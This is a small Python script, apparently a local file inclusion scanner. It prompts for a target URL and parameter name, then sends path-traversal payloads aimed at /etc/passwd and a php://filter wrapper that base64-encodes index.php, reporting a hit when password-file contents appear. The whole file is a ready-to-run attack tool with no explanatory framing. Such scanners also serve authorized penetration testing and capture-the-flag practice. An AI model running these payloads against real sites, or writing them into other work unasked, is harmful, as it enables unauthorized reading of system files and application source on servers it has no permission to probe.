#!/usr/bin/python3

import requests

lfi_payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php"
]


def test_payloads(base_url, param="file", payloads=[]):
    print(f"\n[+] Testing {len(payloads)} payloads on: {base_url}\n")
    headers = {'User-Agent': 'Mozilla/5.0'}

    for payload in payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            response = requests.get(url, headers=headers, timeout=5)

            print(f"[>] Testing: {url}")
            if "root:x:0:0:" in response.text:
                print("     Possible LFI found! detected.")
            elif response.status_code == 200:
                print("    [+] 200 OK — Response length:", len(response.text))
            else:
                print("    [-] Status:", response.status_code)
        except Exception as e:
            print(f"    [!] Error: {e}")

if __name__ == "__main__":
    target_url = input("Enter vulnerable URL (e.g., http://site.com/vuln.php): ").strip()
    param_name = input("Enter parameter name (default: file,page,path): ").strip() or "file"

    print("\n=== LFI Testing ===")
    test_payloads(target_url, param=param_name, payloads=lfi_payloads)
